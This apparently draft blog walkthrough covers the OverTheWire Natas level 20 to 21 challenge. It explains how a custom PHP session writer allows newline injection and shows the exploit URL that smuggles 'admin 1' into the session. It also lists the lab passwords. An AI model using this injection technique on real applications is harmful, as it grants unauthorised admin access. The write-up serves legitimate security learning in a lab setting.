---
title: Wargames - Natas 21
published: false 
tags: game natas
---

## [Level 21](https://overthewire.org/wargames/natas/natas21.html)

Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
Lab URL: http://natas20.natas.labs.overthewire.org/

Firstly we should be most interested in source code, lets get closer look. 

This part sets handers to manage session:
```
session_set_save_handler(
    "myopen", // not interesting
    "myclose", // not interesting
    "myread", // interesing
    "mywrite", // interesing
    "mydestroy", // not interesting
    "mygarbage" // not interesting
    );
```

This function set custom handers to process session data. More about it is ![here](https://www.php.net/manual/en/function.session-set-save-handler.php).

I remove all not interesting code from php code:
```
<?
function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n"; // This line is very interesting 
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

session_set_save_handler(
    "myread", 
    "mywrite", 
);
?> 
```

Ther is possibility to incject own code, by submitting:
```
http://natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin%201
```

we receive password.

password: IFekPyrQXftziDEsUr3x21sYuahypdgJ